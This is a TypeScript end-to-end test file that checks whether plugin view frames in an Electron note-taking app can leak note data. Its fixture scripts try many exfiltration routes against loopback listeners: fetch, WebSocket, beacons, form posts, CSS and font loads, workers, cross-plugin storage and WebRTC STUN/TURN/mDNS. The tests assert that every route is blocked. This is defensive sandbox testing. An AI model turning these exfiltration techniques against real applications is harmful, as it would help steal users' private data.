import { execFile } from 'node:child_process'
import { randomBytes } from 'node:crypto'
import { createSocket } from 'node:dgram'
import { appendFile, readFile } from 'node:fs/promises'
import { connect, createServer, type Server } from 'node:net'
import path from 'node:path'
import { promisify } from 'node:util'
import type { ElectronApplication, Worker } from 'playwright'
import { afterEach, describe, expect, it } from 'vitest'
import type { Capability } from '../../api/capabilities.ts'
import { defaultSwitches, StateStore } from '../../backend/boot/state.ts'
import { partition, ROLES, type Role } from '../../backend/runtime/sessions.ts'
import { buildPlugin } from '../../sdk/build/esbuild.ts'
import { filesFor, workerManifest, writeFolder, writeApproved } from '../plugins-manager-fakes.ts'
import { cleanup, counting, editorPage, launch, logged, temp, tick, until, workersPage } from './helpers.ts'

const run = promisify(execFile)
const listeners: Server[] = []
afterEach(async () => {
  for (const server of listeners.splice(0)) server.close()
  await cleanup()
})

// HETU_PROBES=<file> appends what each case found, one JSON line each
async function found(probe: string, result: unknown): Promise<void> {
  const file = process.env.HETU_PROBES
  if (file !== undefined && file !== '') await appendFile(file, `${JSON.stringify({ probe, result })}
`)
}

const sdk = path.join(import.meta.dirname, '..', '..', 'sdk', 'index.ts').split(path.sep).join('/')

// Each plugin's worker: records every ui event and hands its ctx to the test
const worker = `
import { definePlugin } from '${sdk}'
export default definePlugin({
  start(ctx) {
    const scope = globalThis as Record<string, unknown>
    scope.ctx = ctx
    const heard: unknown[] = []
    scope.heard = heard
    for (const topic of ['view.opened', 'view.message'] as const) ctx.ui.on(topic, event => heard.push(event))
  },
})
`
// A layout drawing each open view in a column beside the note's editor, again at every state
const columns = `
import { definePlugin } from '${sdk}'
export default definePlugin({
  start(ctx) {
    ctx.ui.on('layout.state', event => {
      void ctx.ui.layout.draw({ kind: 'box', id: 'root', style: { display: 'flex', height: '100%' }, children: [
        ...event.state.views.map(view => ({ kind: 'slot', id: 's-' + view.instance, instance: view.instance, style: { width: '300px' } })),
        { kind: 'editor', id: 'e', instance: 'current', style: { flex: '1' } },
      ] }).catch(() => {})
    })
  },
})
`
const page = (script: string) => `<!doctype html><html><head><meta charset="utf-8"><script src="${script}"></script></head><body><p>frame</p></body></html>`

// hetu with the columns layout and these plugins, each with one view drawn by its frame board.html among its files.
// Answers once each plugin's frame has said hello
async function started(plugins: Record<string, Record<string, string>>): Promise<{ app: ElectronApplication, dataDir: string, workers: Record<string, Worker> }> {
  const dataDir = await temp()
  const store = new StateStore(dataDir)
  await store.writeSwitches({ ...defaultSwitches(), off: [] })
  await store.writeLuoshu({ folder: await temp() })
  const source = await temp()
  await writeFolder(source, { 'src/worker.ts': worker, 'src/columns.ts': columns })
  const [built] = await buildPlugin(source, { entries: { 'worker.js': 'src/worker.ts' }, workers: ['worker.js'], write: false })
  const granted: Capability[] = [{ type: 'ui.view' }]
  for (const [id, files] of Object.entries(plugins)) {
    const manifest = workerManifest(id, {
      capabilities: granted,
      entries: { worker: 'worker.js', frames: { board: 'board.html' } },
      views: { board: { title: 'board', kind: 'view', frame: 'board' } },
    })
    const root = path.join(dataDir, 'plugins', id)
    await writeFolder(root, filesFor(manifest, { 'worker.js': built.text, 'icon.svg': '<svg xmlns="http://www.w3.org/2000/svg"/>', ...files }))
    await writeApproved(store, id, root, { granted })
  }
  const layout = path.join(dataDir, 'plugins', 'columns')
  const [drawn] = await buildPlugin(source, { entries: { 'worker.js': 'src/columns.ts' }, workers: ['worker.js'], write: false })
  const layoutGrants: Capability[] = [{ type: 'ui.layout' }]
  await writeFolder(layout, filesFor(workerManifest('columns', { capabilities: layoutGrants }), { 'worker.js': drawn.text }))
  await writeApproved(store, 'columns', layout, { granted: layoutGrants })
  const app = await launch(dataDir)
  const editor = await editorPage(app)
  for (const id of ['columns', ...Object.keys(plugins)]) await until(() => logged(dataDir, 'plugin.started', { plugin: id }))
  await editor.locator('#views').click()
  await until(async () => editor.locator('#menu').isVisible())
  await editor.locator('#menu select').first().selectOption('columns')
  await editor.locator('#menu-close').click()
  const workers: Record<string, Worker> = {}
  for (const id of Object.keys(plugins)) {
    const host = await workersPage(app, id)
    await until(() => host.workers().length === 1)
    workers[id] = host.workers()[0] as Worker
    await until(async () => (await messages(workers[id]!)).length >= 1)
  }
  return { app, dataDir, workers }
}

type Heard = { topic: string, instance?: string, data?: unknown }
const messages = async (worker: Worker) => ((await worker.evaluate('globalThis.heard')) as Heard[]).filter(event => event.topic === 'view.message').map(event => event.data)
// The data goes in as evaluate's argument, so no code is built from it
const post = (worker: Worker, data: unknown) => worker.evaluate(async sent => {
  const scope = globalThis as unknown as { heard: Heard[], ctx: { ui: { views: { post(instance: string, data: unknown): Promise<void> } } } }
  const opened = scope.heard.find(event => event.topic === 'view.opened')!
  await scope.ctx.ui.views.post(opened.instance!, sent)
}, data)
// The first message the frame sends after this one is posted to it
async function ask(worker: Worker, data: unknown): Promise<Record<string, unknown>> {
  const before = (await messages(worker)).length
  await post(worker, data)
  await until(async () => (await messages(worker)).length > before)
  return (await messages(worker))[before] as Record<string, unknown>
}

// A TCP listener on loopback standing in for the network, keeping the first line of each connection
async function listener(): Promise<{ port: number, heard: string[] }> {
  const heard: string[] = []
  const server = createServer(socket => {
    heard.push('connection')
    socket.once('data', data => heard.push(data.toString('latin1').split('\r\n')[0]!))
    socket.on('error', () => {})
    setTimeout(() => socket.destroy(), 200)
  })
  listeners.push(server)
  await new Promise<void>(resolve => server.listen(0, '127.0.0.1', resolve))
  return { port: (server.address() as { port: number }).port, heard }
}

// The net log of everything Chromium did while the run went
async function netLogged(app: ElectronApplication, run: () => Promise<void>): Promise<string> {
  const log = path.join(await temp(), 'net.json')
  await app.evaluate(({ netLog }, file) => netLog.startLogging(file, { captureMode: 'everything' }), log)
  await run()
  await app.evaluate(({ netLog }) => netLog.stopLogging())
  const text = await readFile(log, 'utf8')
  expect(text).toContain('"constants"')
  return text
}

// The fixture plugin's frame: told where to by the test, tries every way out of its own files it has and reports what
// each saw. An outcome is load, read, open, ran or registered only when something got through
const exfil = `
function attempt(run) {
  return new Promise(function (resolve) {
    var settled = false
    function end(outcome) { if (!settled) { settled = true; resolve(outcome) } }
    setTimeout(function () { end('quiet') }, 2000)
    try { run(end) } catch (err) { end('threw ' + err.name) }
  })
}
function add(tag, attributes, parent) {
  var element = document.createElement(tag)
  for (var name in attributes) element.setAttribute(name, attributes[name])
  ;(parent || document.head).appendChild(element)
  return element
}
function loads(tag, attributes) {
  return attempt(function (end) {
    var element = add(tag, attributes, document.body)
    element.onload = function () { end('load') }
    element.onerror = function () { end('error') }
  })
}
function started(make) {
  return attempt(function (end) {
    var worker = make()
    var port = worker.port || worker
    port.onmessage = function () { end('ran') }
    if (worker.port) worker.port.start()
    worker.onerror = function () { end('error') }
  })
}
function ways(to) {
  var http = 'http://127.0.0.1:' + to.port + '/'
  return {
    fetch: attempt(function (end) { fetch(http + 'fetch').then(function (r) { return r.text() }).then(function (t) { end('read ' + t) }, function (err) { end('rejected ' + err.name) }) }),
    xhr: attempt(function (end) { var x = new XMLHttpRequest(); x.open('GET', http + 'xhr'); x.onload = function () { end('read ' + x.responseText) }; x.onerror = function () { end('error') }; x.send() }),
    websocket: attempt(function (end) { var w = new WebSocket('ws://127.0.0.1:' + to.port + '/ws'); w.onopen = function () { end('open') }; w.onerror = function () { end('error') } }),
    eventsource: attempt(function (end) { var s = new EventSource(http + 'es'); s.onopen = function () { end('open') }; s.onerror = function () { s.close(); end('error') } }),
    beacon: attempt(function (end) { end('returned ' + navigator.sendBeacon(http + 'beacon', 'note text')) }),
    form: attempt(function (end) { var f = add('form', { action: http + 'form', method: 'post' }, document.body); add('input', { name: 'note', value: 'note text' }, f); f.submit(); setTimeout(function () { end('quiet') }, 1000) }),
    open: attempt(function (end) { end(window.open(http + 'open') === null ? 'null' : 'open') }),
    top: attempt(function (end) { top.location.href = http + 'top'; end('assigned') }),
    prefetch: attempt(function (end) {
      add('link', { rel: 'prefetch', href: http + 'prefetch' }); add('link', { rel: 'preload', as: 'fetch', href: http + 'preload' })
      add('link', { rel: 'preconnect', href: http }); add('link', { rel: 'dns-prefetch', href: '//' + to.label + '.example' })
      setTimeout(function () { end('quiet') }, 1500)
    }),
    css: loads('link', { rel: 'stylesheet', href: 'exfil.css' }).then(function (own) {
      document.body.style.backgroundImage = 'url(' + http + 'cssom)'
      return new FontFace('out', 'url(' + http + 'font)').load().then(function () { return 'sheet ' + own + ', font load' }, function () { return 'sheet ' + own + ', font error' })
    }),
    editorScript: loads('script', { src: 'hetu://editor/page.js' }),
    editorStyle: loads('link', { rel: 'stylesheet', href: 'hetu://editor/shell.css' }),
    imagesHost: loads('img', { src: 'hetu://images/' + to.ticket }),
    otherIcon: loads('img', { src: 'hetu://' + to.other + '.views/icon/icon.svg' }),
    otherScript: loads('script', { src: to.otherScript }),
    worker: started(function () { return new Worker('w.js') }),
    blobWorker: started(function () { return new Worker(URL.createObjectURL(new Blob(['postMessage(1)'], { type: 'text/javascript' }))) }),
    sharedWorker: started(function () { return new SharedWorker('w.js') }),
    serviceWorker: attempt(function (end) {
      if (!navigator.serviceWorker) return end('absent')
      navigator.serviceWorker.register('w.js').then(function () { end('registered') }, function (err) { end('rejected ' + err.name) })
    }),
  }
}
// Every way a frame could hand another plugin's frame a note: a broadcast and each store. Answers what was there to read
function stores(note) {
  function each(run) { try { return run() } catch (err) { return 'threw ' + err.name } }
  return {
    local: each(function () { var was = localStorage.getItem('hetu'); if (note) localStorage.setItem('hetu', note); return was }),
    session: each(function () { var was = sessionStorage.getItem('hetu'); if (note) sessionStorage.setItem('hetu', note); return was }),
    cookie: each(function () { var was = document.cookie; if (note) document.cookie = 'hetu=' + note; return was }),
    indexedDB: each(function () { indexedDB.open('hetu'); return 'opened' }),
    caches: each(function () { return typeof caches }),
  }
}
var heard = []
var channel = null
window.addEventListener('message', function (event) {
  if (event.source !== parent || !event.ports[0]) return
  var port = event.ports[0]
  port.onmessage = function (message) {
    var data = JSON.parse(message.data)
    if (data.ways) {
      var all = ways(data.ways)
      var names = Object.keys(all)
      Promise.all(names.map(function (name) { return all[name] })).then(function (outcomes) {
        var report = {}
        names.forEach(function (name, i) { report[name] = outcomes[i] })
        port.postMessage(JSON.stringify({ outcomes: report }))
      })
    }
    if (data.go) location.href = 'http://127.0.0.1:' + data.go + '/navigate'
    if (data.listen) {
      channel = new BroadcastChannel('hetu')
      channel.onmessage = function (e) { heard.push(e.data) }
      var own = new BroadcastChannel('hetu')
      own.postMessage('own')
      setTimeout(function () { own.close(); port.postMessage(JSON.stringify({ listening: true })) }, 500)
    }
    if (data.send) {
      var sending = new BroadcastChannel('hetu')
      sending.postMessage(data.send)
      port.postMessage(JSON.stringify({ sent: stores(data.send) }))
    }
    if (data.read) port.postMessage(JSON.stringify({ heard: heard, stored: stores(null) }))
  }
  port.postMessage(JSON.stringify({ hello: location.host }))
})
`
const exfilCss = (port: number) => `@import url("http://127.0.0.1:${port}/import.css");
@font-face { font-family: out; src: url("http://127.0.0.1:${port}/face.woff2"); }
body { background-image: url("http://127.0.0.1:${port}/css-url.png"); font-family: out; }
`
const exfilFiles = (port: number) => ({ 'board.html': page('exfil.js'), 'exfil.js': exfil, 'exfil.css': exfilCss(port), 'w.js': 'postMessage(1)' })
// What got through: an outcome that loaded, read, opened, ran or registered
const through = (outcomes: Record<string, string>) => Object.entries(outcomes).filter(([, outcome]) => /^(load|read|open|ran|registered)|load$/.test(outcome))

describe('a view frame on its plugin\'s host', () => {
  it('reaches nothing outside its plugin\'s files by any request, page, worker or load from hetu\'s other hosts', async () => {
    const out = await listener()
    const label = `hetu${randomBytes(6).toString('hex')}`
    const { app, workers } = await started({ kanban: exfilFiles(out.port), other: { 'board.html': page('other.js'), 'other.js': exfil } })
    const frames = await app.evaluate(({ webContents }) => webContents.getAllWebContents().flatMap(contents => contents.mainFrame.framesInSubtree.map(frame => frame.url)))
    const otherBoard = frames.find(url => url.startsWith('hetu://other.views/'))!
    const ticket = randomBytes(16).toString('hex')
    let report: Record<string, unknown> = {}
    const text = await netLogged(app, async () => {
      report = await ask(workers.kanban!, { ways: { port: out.port, label, ticket, other: 'other', otherScript: otherBoard.replace(/board\.html$/, 'other.js') } })
    })
    const outcomes = report.outcomes as Record<string, string>
    await found('ways out', outcomes)
    expect(Object.keys(outcomes)).toHaveLength(19)
    expect(through(outcomes)).toEqual([])
    expect(outcomes.fetch).toBe('rejected TypeError')
    expect(out.heard).toEqual([])
    expect(text).not.toContain(`127.0.0.1:${out.port}`)
    expect(text).not.toContain(label)
    // The editor page is still where it was and the frame still answers
    expect(await app.evaluate(({ webContents }) => webContents.getAllWebContents().some(contents => contents.getURL() === 'hetu://editor/'))).toBe(true)
    expect(await ask(workers.kanban!, { read: true })).toHaveProperty('stored')
  })

  it('reaches nothing when it navigates itself to the network, and is removed', async () => {
    const out = await listener()
    const { workers, dataDir } = await started({ kanban: exfilFiles(out.port) })
    await post(workers.kanban!, { go: out.port })
    await until(() => logged(dataDir, 'frame.navigated', { plugin: 'kanban' }))
    await tick(500)
    expect(out.heard).toEqual([])
  })

  it('hands another plugin\'s frame nothing by a broadcast or a store', async () => {
    const { workers } = await started({ kanban: exfilFiles(1), other: { 'board.html': page('exfil.js'), 'exfil.js': exfil } })
    expect(await ask(workers.other!, { listen: true })).toEqual({ listening: true })
    const note = `note${randomBytes(6).toString('hex')}`
    await ask(workers.kanban!, { send: note })
    await tick(500)
    const read = await ask(workers.other!, { read: true }) as { heard: string[], stored: Record<string, unknown> }
    await found('between plugins', read)
    // The frame hears its own channel, so a broadcast from the other plugin would have been heard
    expect(read.heard).toEqual(['own'])
    expect(JSON.stringify(read.stored)).not.toContain(note)
  })
})

// A frame's script that, sent ICE servers, opens a peer connection to each and offers, as an artifact sending a note
// out through WebRTC would. Sent an mDNS name as well, it hands a second connection a remote candidate on <name>.local.
// It reports each connection's gathering state 3 s later, once for each time it is sent servers
const rtc = `
function offered(server) {
  var connection = new RTCPeerConnection({ iceServers: [server] })
  connection.createDataChannel('out')
  return connection.createOffer().then(function (offer) { return connection.setLocalDescription(offer) }).then(function () { return connection })
}
function remote(name) {
  var offerer = new RTCPeerConnection()
  offerer.createDataChannel('out')
  var answerer = new RTCPeerConnection()
  return offerer.createOffer().then(function (offer) { return answerer.setRemoteDescription(offer) }).then(function () {
    return answerer.addIceCandidate({ candidate: 'candidate:1 1 udp 2122260223 ' + name + '.local 54321 typ host', sdpMid: '0', sdpMLineIndex: 0 })
  }).then(function () {
    offerer.close()
    return answerer
  })
}
window.addEventListener('message', function (event) {
  if (event.source !== parent || !event.ports[0]) return
  var port = event.ports[0]
  port.onmessage = function (message) {
    var data = JSON.parse(message.data)
    if (!data || !Array.isArray(data.servers)) return
    var opening = data.servers.map(offered)
    if (typeof data.mdns === 'string') opening.push(remote(data.mdns))
    Promise.all(opening).then(function (opened) {
      setTimeout(function () {
        port.postMessage(JSON.stringify({ tried: opened.map(function (connection) { return connection.iceGatheringState }) }))
        opened.forEach(function (connection) { connection.close() })
      }, 3000)
    }, function (err) { port.postMessage(JSON.stringify({ failed: String(err) })) })
  }
  port.postMessage(JSON.stringify({ hello: location.pathname }))
})
`
const rtcFiles = { kanban: { 'board.html': page('rtc.js'), 'rtc.js': rtc } }

type RtcReport = { tried?: string[], failed?: string }
const isReport = (data: unknown) => (data as RtcReport).tried !== undefined || (data as RtcReport).failed !== undefined

// What the frame reported after its peer connections tried to reach the ICE servers it was sent this time
async function rtcReport(worker: Worker, servers: object[], mdns?: string): Promise<RtcReport> {
  await until(async () => (await messages(worker)).length >= 1)
  const before = (await messages(worker)).filter(isReport).length
  await post(worker, mdns === undefined ? { servers } : { servers, mdns })
  await until(async () => (await messages(worker)).filter(isReport).length > before)
  return (await messages(worker)).filter(isReport)[before] as RtcReport
}

describe('WebRTC from a view frame', () => {
  it('sends no STUN packet over UDP to a server on loopback, with the policy set on every web contents', async () => {
    const stun = createSocket('udp4')
    let packets = 0
    stun.on('message', () => packets++)
    await new Promise<void>(resolve => stun.bind(0, '127.0.0.1', resolve))
    try {
      const { app, workers: { kanban: worker } } = await started(rtcFiles)
      const report = await rtcReport(worker, [{ urls: `stun:127.0.0.1:${stun.address().port}` }])
      expect(report).toEqual({ tried: [expect.any(String)] })
      expect(packets).toBe(0)
      const policies = await app.evaluate(({ webContents }) => webContents.getAllWebContents().map(contents => contents.getWebRTCIPHandlingPolicy()))
      expect(policies.length).toBeGreaterThanOrEqual(2)
      expect(new Set(policies)).toEqual(new Set(['disable_non_proxied_udp']))
      // The control: with the editor's policy back to Chromium's default, the same frame's STUN reaches the listener
      await app.evaluate(({ webContents }) => {
        for (const contents of webContents.getAllWebContents()) if (contents.getURL() === 'hetu://editor/') contents.setWebRTCIPHandlingPolicy('default')
      })
      await rtcReport(worker, [{ urls: `stun:127.0.0.1:${stun.address().port}` }])
      await until(() => packets > 0, 5000)
    } finally {
      stun.close()
    }
  })

  it('opens no TURN connection over TCP to a server on loopback, with every session behind a proxy that leads nowhere', async () => {
    let connections = 0
    const turn = createServer(socket => {
      connections++
      socket.destroy()
    })
    await new Promise<void>(resolve => turn.listen(0, '127.0.0.1', resolve))
    try {
      const { app, workers: { kanban: worker } } = await started(rtcFiles)
      const { port } = turn.address() as { port: number }
      const report = await rtcReport(worker, [{ urls: `turn:127.0.0.1:${port}?transport=tcp`, username: 'note text', credential: 'x' }])
      expect(report).toEqual({ tried: [expect.any(String)] })
      expect(connections).toBe(0)
      const partitions = (Object.keys(ROLES) as Role[]).map(partition)
      const proxies = await app.evaluate(({ session }, names) => Promise.all([session.defaultSession, ...names.map(name => session.fromPartition(name))]
        .flatMap(each => ['http://127.0.0.1/', 'https://example.com/'].map(url => each.resolveProxy(url)))), partitions)
      expect(proxies).toHaveLength(8)
      expect(new Set(proxies)).toEqual(new Set(['SOCKS5 127.0.0.1:1']))
      // With the editor session going direct the frame still reaches nothing, since Chromium resolves no host, an IP
      // literal included. The listener itself hears a connection from here
      await app.evaluate(({ session }, name) => session.fromPartition(name).setProxy({ mode: 'direct' }), partition('editor'))
      await rtcReport(worker, [{ urls: `turn:127.0.0.1:${port}?transport=tcp`, username: 'note text', credential: 'x' }])
      expect(connections).toBe(0)
      await new Promise<void>(resolve => connect(port, '127.0.0.1').on('close', () => resolve()).on('error', () => resolve()))
      expect(connections).toBe(1)
    } finally {
      turn.close()
    }
  })

  it('resolves no host name in Chromium for any session, while main\'s own fetch still resolves localhost through Node', async () => {
    const server = await counting()
    const { app } = await started(rtcFiles)
    const fetched = await app.evaluate(async (_electron, url) => (await fetch(url)).text(), server.url.replace('127.0.0.1', 'localhost'))
    expect(fetched).toBe('reached')
    expect(server.hits()).toBe(1)
    const partitions = (Object.keys(ROLES) as Role[]).map(partition)
    const answers = await app.evaluate(({ session }, names) => Promise.all([session.defaultSession, ...names.map(name => session.fromPartition(name))]
      .flatMap(each => [each.resolveHost('localhost'), each.resolveHost('127.0.0.1'), each.resolveHost('hetu-probe.invalid'), each.resolveHost('hetu-probe.local', { source: 'mdns' })])
      .map(lookup => lookup.then(found => `resolved ${JSON.stringify(found)}`, (err: Error) => err.message))), partitions)
    expect(answers).toHaveLength(16)
    for (const answer of answers) expect(answer).toMatch(/ERR_NAME_NOT_RESOLVED/)
  })

  it('looks up no name a frame gives as a TURN or STUN server or an mDNS candidate, by the net log and a listener on loopback', async () => {
    const label = `hetu${randomBytes(6).toString('hex')}`
    const mdns = createSocket({ type: 'udp4', reuseAddr: true })
    let queries = 0
    mdns.on('message', message => {
      if (message.includes(label)) queries++
    })
    // macOS's mDNSResponder holds the wildcard address on 5353 and Node's reuseAddr sets only SO_REUSEPORT there, which
    // shares the same address and not a narrower one beside it, so the listener takes the wildcard on macOS
    await new Promise<void>(resolve => mdns.bind(5353, process.platform === 'darwin' ? '0.0.0.0' : '127.0.0.1', resolve))
    mdns.addMembership('224.0.0.251', '127.0.0.1')
    try {
      const { app, workers: { kanban: worker } } = await started(rtcFiles)
      const log = path.join(await temp(), 'net.json')
      await app.evaluate(({ netLog }, file) => netLog.startLogging(file, { captureMode: 'everything' }), log)
      const report = await rtcReport(worker, [
        { urls: `turn:${label}t.hetu-probe.invalid:3478?transport=tcp`, username: 'note text', credential: 'x' },
        { urls: `stun:${label}s.hetu-probe.invalid:3478` },
      ], `${label}m`)
      expect(report).toEqual({ tried: [expect.any(String), expect.any(String), expect.any(String)] })
      await app.evaluate(({ netLog }) => netLog.stopLogging())
      const text = await readFile(log, 'utf8')
      expect(text).toContain('"constants"')
      const seen = { turn: text.includes(`${label}t`), stun: text.includes(`${label}s`), mdns: text.includes(`${label}m`), multicast: queries }
      expect(seen).toEqual({ turn: false, stun: false, mdns: false, multicast: 0 })
    } finally {
      mdns.close()
    }
  })
})

// The sockets the given processes hold on an address other than loopback: UDP endpoints and TCP sockets in any state,
// looked at every 300 ms for about 4 s
async function openSockets(pids: number[]): Promise<string[]> {
  const found = new Set<string>()
  const local = /^(127\.|::1$|\[::1\]|localhost)/
  if (process.platform === 'win32') {
    const script = `$p = @(${pids.join(',')}); foreach ($i in 1..13) {
      Get-NetUDPEndpoint | Where-Object { $p -contains $_.OwningProcess } | ForEach-Object { "udp $($_.LocalAddress) $($_.LocalPort)" }
      Get-NetTCPConnection -ErrorAction SilentlyContinue | Where-Object { $p -contains $_.OwningProcess } | ForEach-Object { "tcp $($_.LocalAddress) $($_.LocalPort)" }
      Start-Sleep -Milliseconds 300 }`
    const { stdout } = await run('powershell.exe', ['-NoProfile', '-NonInteractive', '-Command', script])
    for (const line of stdout.split(/\r?\n/)) if (line !== '') found.add(line)
  } else {
    for (let i = 0; i < 13; i++) {
      // lsof exits 1 when the processes hold no socket at all
      const { stdout } = await run('lsof', ['-i', '-n', '-P', '-a', '-p', pids.join(',')]).catch((err: { stdout?: string }) => ({ stdout: err.stdout ?? '' }))
      for (const line of stdout.split('\n').slice(1)) {
        const [, , , , , , , protocol, name] = line.trim().split(/\s+/)
        if (protocol !== undefined && name !== undefined) found.add(`${protocol.toLowerCase()} ${name.replace(/->.*$/, '').replace(/:(\d+|\*)$/, ' $1')}`)
      }
      await tick(300)
    }
  }
  return [...found].filter(entry => !local.test(entry.split(' ')[1]!))
}

describe('the sockets of a frame\'s WebRTC', () => {
  // TODO: a frame's RTCPeerConnection makes Chromium's network service bind UDP 5353 on 0.0.0.0 and :: for its mDNS
  // responder and a UDP pair on 0.0.0.0 and :: for each connection's gathering, under disable_non_proxied_udp, which
  // raises the firewall's prompt. Drop fails once hetu stops them and run it on macOS once checked there
  it.runIf(process.platform === 'win32').fails('leaves no hetu process holding a socket on an address other than loopback while a frame offers', async () => {
    const stun = createSocket('udp4')
    await new Promise<void>(resolve => stun.bind(0, '127.0.0.1', resolve))
    try {
      const { app, workers: { kanban: worker } } = await started(rtcFiles)
      const pids = await app.evaluate(({ app: electronApp }) => electronApp.getAppMetrics().map(metric => metric.pid))
      expect(pids.length).toBeGreaterThanOrEqual(4)
      const [open, report] = await Promise.all([openSockets(pids), rtcReport(worker!, [{ urls: `stun:127.0.0.1:${stun.address().port}` }])])
      await found('open sockets', open)
      expect(report).toEqual({ tried: [expect.any(String)] })
      expect(open).toEqual([])
    } finally {
      stun.close()
    }
  })
})
